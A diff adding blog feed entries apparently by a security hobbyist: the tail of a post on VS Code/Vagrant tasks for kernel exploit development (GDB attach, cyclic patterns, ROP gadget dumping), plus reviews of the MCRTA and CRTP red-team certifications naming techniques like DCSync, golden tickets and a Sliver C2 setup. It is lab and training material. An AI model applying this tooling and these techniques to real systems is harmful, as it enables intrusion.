+		</span><span class="p">},</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Connect to remote gdbserver via GDB CLI with 1 initial breakpoint (Vagrant)"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"args"</span><span class="p">:[</span><span class="s2">"ssh"</span><span class="p">,</span><span class="s2">"-c"</span><span class="p">,</span><span class="s2">"</span><span class="se">\"</span><span class="s2">gdb -ex='tar rem :1234' -ex='b *${input:memory_bp}' -ex=c</span><span class="se">\"</span><span class="s2">"</span><span class="p">]</span><span class="w">
+		</span><span class="p">},</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Unzip initramfs folder (Vagrant)"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w"> </span><span class="err">//</span><span class="w"> </span><span class="err">&lt;--</span><span class="w"> </span><span class="err">your</span><span class="w"> </span><span class="err">shell</span><span class="w"> </span><span class="err">here</span><span class="w">
+			</span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+				</span><span class="s2">"ssh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2">cd /vagrant; bash ./unzip_cpio.sh</span><span class="se">\"</span><span class="s2">"</span><span class="w">
+				</span><span class="p">]</span><span class="w">
+		</span><span class="p">}</span><span class="w">
+	</span><span class="p">],</span><span class="w">
+	</span><span class="nl">"inputs"</span><span class="p">:</span><span class="w">
+	</span><span class="p">[</span><span class="w">
+		</span><span class="p">{</span><span class="w">
+			</span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Enter the address location that you want to set a breakpoint on before proceeding with GDB"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"memory_bp"</span><span class="p">,</span><span class="w">
+			</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"promptString"</span><span class="w">
+		</span><span class="p">}</span><span class="w">
+	</span><span class="p">]</span><span class="w">
+	
+
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Bear in mind that the Vagrantfile and the scripts mentioned are all located within a single workspace, as shown in the VSCode File Explorer example here:</p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304072728.png" alt="" /></p>
+
+<p>To initialise the setup, you will need to make sure that:</p>
+<ul>
+  <li>All your kernel-related files such as the config, bzImage and initramfs.cpio.gz file are located in that same folder</li>
+  <li>Run the following command to start up the Vagrant VM
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant up
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>By default, Vagrant maps all the current working directory files as a shared drive within the VM, under the location /vagrant. With that in mind, the various VSCode Tasks defined in tasks.json will work as there is no change with regards to the location of the scripts.</p>
+<h2 id="the-result">The Result</h2>
+<p>To test out the task, I just simply need to do the following steps (but make sure your Vagrant VM is already up before proceeding):
+1) Ensure that the tasks.json file is inside the .vscode folder (refer to the previous screenshot)
+2) Press Ctrl+Shift+P to launch the Command Palette. Click on <strong>Tasks: Run Task</strong></p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304073226.png" alt="" /></p>
+
+<p>3) Navigate to the task <strong>Compile exploit and launch kernel (Vagrant)</strong>. This will result in the Integrated Terminal showing the compilation of the exploit along with the kernel on pause until GDB is attached (as I have set it to debug mode):</p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304074339.png" alt="" /></p>
+
+<p>4) Repeat Steps (2) and (3), but this time run the task <strong>Connect to remote gdbserver via GDB CLI (Vagrant)</strong>. This will also launch another tab within the Integrated Terminal to load up GDB (for mine it’s pwndbg). Once it’s hooked, just press ‘c’ to continue with the loading of the kernel:</p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304074425.png" alt="" /></p>
+
+<p>5) Under the Integrated Terminal, you can switch back your Terminal interface to the task ‘Compile exploit and launch kernel (Vagrant)’:</p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304074610.png" alt="" /></p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304074721.png" alt="" /></p>
+
+<p>And that’s pretty much it for the setup! Now do bear in mind that all your VS Code tasks are usually performed within the context of your workspace, so you can add on a series of other Tasks that might help you in your day-to-day work. As of now, here’s my list of Tasks that I have defined which proved to be quite useful as I was doing my kernel exploitation work:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="err">//</span><span class="w"> </span><span class="err">See</span><span class="w"> </span><span class="err">https://go.microsoft.com/fwlink/?LinkId=</span><span class="mi">733558</span><span class="w">
+    </span><span class="err">//</span><span class="w"> </span><span class="err">for</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">documentation</span><span class="w"> </span><span class="err">about</span><span class="w"> </span><span class="err">the</span><span class="w"> </span><span class="err">tasks.json</span><span class="w"> </span><span class="err">format</span><span class="w">
+    </span><span class="nl">"version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2.0.0"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"tasks"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Compile exploit and launch kernel (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">  </span><span class="err">//</span><span class="w"> </span><span class="err">&lt;--</span><span class="w"> </span><span class="err">your</span><span class="w"> </span><span class="err">shell</span><span class="w"> </span><span class="err">here</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="s2">"ssh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2">cd /vagrant; bash ./recompile-exploit-run.sh</span><span class="se">\"</span><span class="s2">"</span><span class="w">
+            </span><span class="p">]</span><span class="w">
+            
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Connect to remote gdbserver via GDB CLI (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:[</span><span class="s2">"ssh"</span><span class="p">,</span><span class="s2">"-c"</span><span class="p">,</span><span class="s2">"gdb -ex=</span><span class="se">\"</span><span class="s2">tar rem :1234</span><span class="se">\"</span><span class="s2">"</span><span class="p">]</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Connect to remote gdbserver via GDB CLI with 1 initial breakpoint (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:[</span><span class="s2">"ssh"</span><span class="p">,</span><span class="s2">"-c"</span><span class="p">,</span><span class="s2">"</span><span class="se">\"</span><span class="s2">gdb -ex='tar rem :1234' -ex='b *${input:memory_bp}' -ex=c</span><span class="se">\"</span><span class="s2">"</span><span class="p">]</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Destroy Vagrant VM"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant destroy -f"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Start up Vagrant VM"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant up"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Shut down Vagrant VM"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant halt"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Generate cyclic pattern (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:[</span><span class="s2">"ssh"</span><span class="p">,</span><span class="s2">"-c"</span><span class="p">,</span><span class="s2">"python3 -c </span><span class="se">\"</span><span class="s2">from pwn import *;print(cyclic(${input:pattern_size}))</span><span class="se">\"</span><span class="s2">"</span><span class="p">]</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Get memory offset based on value (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:[</span><span class="s2">"ssh"</span><span class="p">,</span><span class="s2">"-c"</span><span class="p">,</span><span class="s2">"python3 -c </span><span class="se">\"</span><span class="s2">from pwn import *;print(hex(cyclic_find(${input:memory_offset})))</span><span class="se">\"</span><span class="s2">"</span><span class="p">]</span><span class="w">
+            
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Unzip initramfs folder (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">  </span><span class="err">//</span><span class="w"> </span><span class="err">&lt;--</span><span class="w"> </span><span class="err">your</span><span class="w"> </span><span class="err">shell</span><span class="w"> </span><span class="err">here</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="s2">"ssh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2">cd /vagrant; bash ./unzip_cpio.sh</span><span class="se">\"</span><span class="s2">"</span><span class="w">
+            </span><span class="p">]</span><span class="w">
+            
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Generate kernel ROP gadgets from vmlinux to text file (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="s2">"ssh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2">ROPgadget --binary /vagrant/vmlinux &gt; /vagrant/gadgets.txt</span><span class="se">\"</span><span class="s2">"</span><span class="w">
+            </span><span class="p">]</span><span class="w">
+            
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"shell"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"label"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Generate userland ROP gadgets from exploit to text file (Vagrant)"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"vagrant"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+                </span><span class="s2">"ssh"</span><span class="p">,</span><span class="w"> </span><span class="s2">"-c"</span><span class="p">,</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2">ROPgadget --binary /vagrant/initramfs/exploit &gt; /vagrant/gadgets-userland.txt</span><span class="se">\"</span><span class="s2">"</span><span class="w">
+            </span><span class="p">]</span><span class="w">
+            
+        </span><span class="p">}</span><span class="w">       
+    </span><span class="p">],</span><span class="w">
+    </span><span class="nl">"inputs"</span><span class="p">:[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Enter the pattern size of your cyclic string."</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pattern_size"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"promptString"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Enter the offset value of the memory address you see in the RIP register"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"memory_offset"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"promptString"</span><span class="w">
+        </span><span class="p">},</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+            </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Enter the address location that you want to set a breakpoint on before proceeding with GDB"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"memory_bp"</span><span class="p">,</span><span class="w">
+            </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"promptString"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+    </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<h1 id="thoughts">Thoughts</h1>
+<p>It’s funny that when i started this project, the main intention was more of to automate the commands/actions that i had to normally do while developing the exploit in Visual Studio Code. But now, come to think of it, this project could also be easily extended to development for the usual userland pwn activities (normal buffer overflow exploits, etc). Since the debugger environment is also on a VM (and it’s a Vagrantfile), this also means that there is a possibility to develop a standard baseline of exploit development tools for anyone who wants to dive into the world of pwn and kernelpwn. And all you need is just Visual Studio Code and Vagrant :)</p>
+
+<p>I might just create a simple GitHub repository with all the necessary folder structures and the tasks defined so that anyone can clone this. But till then, hope you guys enjoy this simple yet amazing setup (i’m loving it anw):</p>
+
+<p><img src="/assets/images/kernelexp101/Pasted image 20250304075521.png" alt="" /></p>]]></content><author><name>baesenseii</name></author><category term="vr" /><category term="kernelpwn" /><category term="pwn" /><summary type="html"><![CDATA[Preface As some of you might already know by now, I have been taking quite a fair interest on doing pwn challenges in CTF as part of my goal to improve on my binary exploitation skills.]]></summary></entry><entry><title type="html">Multi Cloud Red Team Analyst Certification by CyberWarfare Labs</title><link href="http://localhost:4000/posts/mcrta_review_writeup_3ee1dbfe/" rel="alternate" type="text/html" title="Multi Cloud Red Team Analyst Certification by CyberWarfare Labs" /><published>2025-01-12T00:00:00-06:00</published><updated>2025-01-12T00:00:00-06:00</updated><id>http://localhost:4000/posts/mcrta_review_writeup_3ee1dbfe</id><content type="html" xml:base="http://localhost:4000/posts/mcrta_review_writeup_3ee1dbfe/"><![CDATA[<p>Yes, once again, another late entry from my end (got this cert in November 2024) with regards to this freaking review (due to tons and tons of work backlogs, plus i am getting kinda old, lol)</p>
+
+<p>Reference: https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/</p>
+<h1 id="preface">Preface</h1>
+
+<p>Now with all the craze regarding AI and Cloud (especially in school when cybersecurity lecturers themselves are taking basic-level certs on cloud platforms such as AWS), I was wondering if there are any good quality cloud pentesting courses for me to take up. For cloud-based security assessments, i guess the only experience that i managed to get was in CTFs, especially ones that involved AWS IAMs and whatnot. So i do recognise the need for me to build up my skillset in this area of pentesting and eventually red teaming.</p>
+
+<p>A close friend of mine answered my call and asked if i was keen to try this certification out (it was actually like USD 10 for me due to the discount). So I just said, “Well why not la eh? Let’s give it a try.”</p>
+<h1 id="lab-environment--assessment">Lab Environment / Assessment</h1>
+
+<p>After purchasing the labs you are presented with credentials (via email) to go through CW Lab’s Learning Management System (LMS):</p>
+
+<p><img src="/assets/images/certs/Pasted image 20250112184156.png" alt="" /></p>
+
+<p>The thing is that apparently for the entire lab, I was expected to use this RedCloud OS (https://github.com/RedTeamOperations/RedCloud-OS), which happens to be a variation of the Parrot Security OS distribution (but just with more cloud tools). However, as stubborn as I was, I told myself that “nah, i think i can just do it on my Linux host machine just fine”.</p>
+
+<p>Which in this case, after great difficulty, it was actually possible to do it (just by installing the packages listed in the README.md file of the RedCloud-OS GitHub repository).</p>
+
+<p>Within the LMS itself, the MCRTA certification covers three platforms, mainly AWS, GCP and Azure. These three platforms are basically the three modules that are required for the student to clear in order to obtain the certification.</p>
+
+<p>The study materials were mainly videos with narratives/explanations on the slides etc. To be frank I was not the kind to watch videos first, and then go do the labs. I ended up just doing the labs and figuring out what to do along the way.</p>
+
+<p><img src="/assets/images/certs/Pasted image 20250112184700.png" alt="" /></p>
+
+<p>If you notice the screenshot above, there is the ‘Flag’ tab right? So what it is actually a series of questions (10 of them in total) that the student needs to answer in order to clear the module. The answers to these questions are usually based on the lab environment provided for the practice, and students are to use whatever they learnt in the slides/video lectures to get the answers.</p>
+
+<p>As for the certification assessment, surprisingly there was no need to do any exam booking whatsoever (unlike the usual certifications that I went through). In order to be certified, you simply need to clear all three modules (finish all the ‘Flag’ tabs) and then you will be awarded with the certification:</p>
+
+<p><img src="/assets/images/certs/Pasted image 20250112191421.png" alt="" /></p>
+<h1 id="feedbacks--opinions">Feedbacks / Opinions</h1>
+
+<p>The content is pretty good for anyone to start off on the 3 cloud platforms, but let’s evaluate them based on two things: learning outcomes and the assessment (like how all subjects/modules are designed in any institution).</p>
+<h2 id="learning-outcomes">Learning Outcomes</h2>
+
+<p>Based on the website, these are the things that I am expected to learn by the end of the certification:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Learning Outcome</th>
+      <th>Personal Experience and Feedback</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Perform Red Team Operations in Multi-Cloud Environment</td>
+      <td>In the slides it was more of a high-level overview of what type of red team (or rather cloud pentest) engagements within the three cloud platforms (AWS, GCP, Azure).<br /><br />Unfortunately during the labs/flag finding challenges, majority of the engagement types were more of utilising exposed credentials to ONLY read sensitive data, which I guess this is what the certification wanted to achieve, BUT it wasn’t in line to my definition of red team.</td>
+    </tr>
+    <tr>
+      <td>Learn how to configure credentials and enumerate using CLI</td>
+      <td>Yeah this was pretty much covered during the labs/flag finding challenges.<br /><br />I did spend most of my time reading through the documentation of various tools that interact with the three cloud platforms, which was quite an experience for me.</td>
+    </tr>
+    <tr>
+      <td>Enumerate core cloud services used in enterprises</td>
+      <td>This one was the ONE thing that I felt that was extensively covered for the whole certification (because i do understand that it IS important).<br /></td>
+    </tr>
+    <tr>
+      <td>Exploit chained misconfigurations in multi-cloud environment</td>
+      <td>Initially when I read this learning outcome, my first assumption was exploiting misconfigurations to move laterally from one cloud provider to another (which in my honest opinion would have been very cool and interesting to learn to be honest).<br /><br />Only to discover that it was just more of exploiting misconfigurations within each of the 3 cloud services covered during the course.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="assessment">Assessment</h2>
+
+<p>As mentioned earlier, attaining the certification simply involves completing the flag challenges for each of the modules. The questions designed for the flag challenges are mainly open-ended, which means that the students are expected to type in their answers.</p>
+
+<p>However this led to some experiences/frustrations when submitted answers to certain questions within the flag. For example, when a question asks about a URL as the answer:</p>
+<ul>
+  <li>http://thisistheurl.com (right answer, wut)</li>
+  <li>http://thisistheurl.com/ (wrong answer, HUH)</li>
+</ul>
+
+<p>Seems to me that the LMS itself doesn’t support regular expressions when searching for the answer, or the content creators are quite adamant about only their answers being the acceptable ones. I would think that moving forward, CWL should consider creating questions that would result in unique answers (based on the tools used).</p>
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+
+<p>At first glance, not gonna lie, it looks a bit… suspicious. I did initially get the vibes whereby I thought I was paying for a scam certification programme (due to the LMS layout and the content of the slides). But given the price point (with the discount of course), the content and the labs, well I guess I wouldn’t complain much about it. I did learn quite a number of things (especially from the GCP and Azure platforms). Now the final two questions:</p>
+
+<p>1) <strong>Would I recommend it to people?</strong></p>
+
+<p>Well why not? And after writing this blog, I noticed that the price point of this certification dropped to USD 49 (when i took it, the original price was USD 98 before the discount):</p>
+
+<p><img src="/assets/images/certs/Pasted image 20250112210328.png" alt="" /></p>
+
+<p>I guess the beauty of it is that the MCRTA content constantly gets revamped (I think like once every 6-12 months if i remember correctly, don’t take my word for it), unlike certain modules in my polytechnic that reused content for like more than 5 years and no one wants to change it because of too many responsibilities. So yeah, no harm trying this to be honest!</p>
+
+<p>2) <strong>Who would I recommend it to?</strong></p>
+
+<p>Probably people who would want to get a quick head start on cloud-based penetration testing / security assessments. I personally don’t really like the term red teaming because of the actual definition and the nature of its activities (e.g phishing, AV evasion, etc).</p>]]></content><author><name>baesenseii</name></author><category term="certs" /><category term="mcrta" /><summary type="html"><![CDATA[Yes, once again, another late entry from my end (got this cert in November 2024) with regards to this freaking review (due to tons and tons of work backlogs, plus i am getting kinda old, lol)]]></summary></entry><entry><title type="html">Certified Red Team Professional by Altered Security</title><link href="http://localhost:4000/posts/crtp_review_writeup_98ab231c/" rel="alternate" type="text/html" title="Certified Red Team Professional by Altered Security" /><published>2024-11-03T00:00:00-05:00</published><updated>2024-11-03T00:00:00-05:00</updated><id>http://localhost:4000/posts/crtp_review_writeup_98ab231c</id><content type="html" xml:base="http://localhost:4000/posts/crtp_review_writeup_98ab231c/"><![CDATA[<p>Note that it’s an overdue write-up regarding this certification (achieved it in April 2024), but I think it’s good to pen down my honest thoughts about this.</p>
+
+<p>Reference: <a href="https://www.alteredsecurity.com/post/certified-red-team-professional-crtp">https://www.alteredsecurity.com/post/certified-red-team-professional-crtp</a></p>
+<h1 id="preface">Preface</h1>
+<p>If you take a look at my certifications, it has been like what, 7-8 years since I did any of the crazy-ass certifications by Offensive Security and CREST (because it was no longer required anyway), which is a pretty long duration of time. Over the years I do reach out to peers and junior cybersecurity professionals to know what changes are there in these certifications (especially with Offsec and CREST certifications getting a syllabus refresh from the last time I took it), and one thing commonly popped up across all these certifications: Windows Active Directory Environments.</p>
+
+<p>I have my fair share of performing network penetration testing activities etc (and i’m still not a pro at it), but I’ll be honest though: I am pretty weak when it comes to navigating within AD environments. And with a budget constraint (unlike the old days when my former company sponsors me for certification attempts, but for academia it’s a little bit, difficult), I had to be a bit thrifty in terms of what red team / penetration testing certificates to take.</p>
+
+<p>This is when i came across CRTP (which was initially under PentesterAcademy, but now under Altered Security but the certification is still under the same guy Nikhil Mittal, mad respect for his work too especially his Nishang Powershell scripts which were pretty useful in Windows AD environments).</p>
+<h1 id="lab-experience">Lab Experience</h1>
+<p>After signing up for the program you will be provided with credentials and the link to the training portal. The environment does give me the same feel as the days when I took up Offsec certs whereby VPN access was provided to connect my Kali VM to the lab environment. However what was different is that they also had a Guacamole RDP instance to the compromised Windows machine (which was good for me, but there were moments that it was slow, which is fine).</p>
+
+<p><img src="/assets/images/certs/Pasted image 20241103165421.png" alt="" /></p>
+
+<p>What I really like about this lab is that the primary focus was more of moving laterally across different AD domains and forests (skipping the initial entry part where the lab does an ‘assume breach’ and credentials of a compromised endpoint was provided). Of course the creds weren’t full admin, so we had to some way figure out how to escalate our privileges locally (which was pretty easy using the PowerUp scripts provided).</p>
+
+<p>From there, the labs cover extensively on various AD misconfigurations using a variety of AD enumeration tools (BloodHound being my best friend), ranging from Constraint Delegation Abuse to krbtgt extraction via DCSync. And this course extensively covers the usage of Kerberos Ticket generations (e.g silver tickets, golden tickets, diamond tickets), which is very much the knowledge gap that i needed to bridge from my network pentest experience and certifications. More importantly, this course taught me one VERY VALUABLE lesson regarding Active Directory environments: Don’t settle for just Domain Admin, ALWAYS target for the krbtgt hashes.</p>
+
+<p>And another thing that I really like about this course is regarding the lab materials that are still accessible even after you are done with the course. What’s pretty neat about it is that their materials do get updated every 6 months I believe, and I can also access those materials too (except for the lab environment of course, which you need to pay).</p>
+<h1 id="assessment">Assessment</h1>
+<p>For the assessment, it’s pretty similar to OSCP as it was a 24-hour exam that includes two requirements:</p>
+<ul>
+  <li>Submission of flags obtained from compromised servers</li>
+  <li>Report writeup which also includes recommendations of fixes on the affected servers</li>
+</ul>
+
+<p>And for those who know me, yes i took the exam attempt TWICE (one in January, the other in April due to the 3 month cool-off period). I am not going to disclose much on the details of the assessment (obviously), but this is what I would advise in terms of preparing for the assessment:</p>
+
+<p>1) Be familiar with performing the attacks via both PowerShell and the Windows Command Line</p>
+
+<p>In the labs, CRTP does cover various ways as to how to attain remote access via both PowerShell and Windows Command Line environments (as they are both quite different in nature). This will be very useful whenever you face situations that restrict you on the type of environments that you can use based on what you have.</p>
+
+<p>2) Plan out your resources and methodology</p>
+
+<p>Although the labs have all the necessary commands that you need to run, I felt that arranging them based on how my brain works would be much better. I came up with a set of Obsidian notes to help me document out my commands that i will be using.</p>
+
+<p>As for the infrastructure, I guess it also depends on the individual but what I had in mind was to work like an adversary, which means I will need a C2 platform for me to manage the compromised machines (in addition to the initial access machine that is required of you to gain full admin access to). Interestingly enough, in the lab material I came across this:</p>
+
+<p><img src="/assets/images/certs/Pasted image 20241103163957.png" alt="" /></p>
+
+<p>It was not covered in the CRTP labs, but the PDF document did cover the how-to methods for the Sliver C2 framework via the same attack vectors presented in the labs (and it’s pretty easy thanks to the document).</p>
+
+<p>So in short, my strategy was this:</p>
+<ul>
+  <li>Set up my Sliver C2 on my Kali Linux VM (connected via OpenVPN), with listeners and beacons set up.</li>
+  <li>On the ‘student’ VM (which is the compromised machine), I also transferred some of the tools taught in the lab (OH YA, MAKE SURE YOU HAVE A COPY OF THIS ‘Tools’ FOLDER BECAUSE THERE’S NOTHING IN THE COMPROMISED MACHINE DURING THE EXAM).</li>
+  <li>In addition, the ‘student’ VM was configured with portforwarding so that any incoming requests to the ‘student’ VM will be redirected to my Sliver C2 (for management of compromised targets).</li>
+  <li>Always run SharpHound on new compromised targets so that your BloodHound data is updated</li>
+</ul>
+
+<p>So after two exam attempts, and lots of blood, sweat and tears, I finally managed to get it:</p>
+
+<p><img src="/assets/images/certs/Pasted image 20241103165001.png" alt="" /></p>
+<h1 id="thoughts">Thoughts</h1>
+
+<p>As I have mentioned in my writeup, this certification is probably to me the greatest bridge to those who have taken OSCP a long time ago and wants to bridge the gap on AD environment. I know that the current OSCP syllabus does have elements of Windows AD Lateral Movement, but it isn’t that comprehensive as compared to CRTP.</p>
+
+<p>The teaching materials do contain videos as well, but for me it just didn’t work as I learn more via trial and error (preferred mode of learning is ‘experiential learning’).</p>
+
+<p>There were times during the lab sessions that the provided commands didn’t work as shown in the labs. This is when I do treasure my moments talking to the CRTP Discord community for advice and help (big shout out to the AltSec-Admin too in terms of fixing environments). But of course it will take some time in replying as I think it’s only one person that’s managing this (or more, I am not sure actually).</p>
+
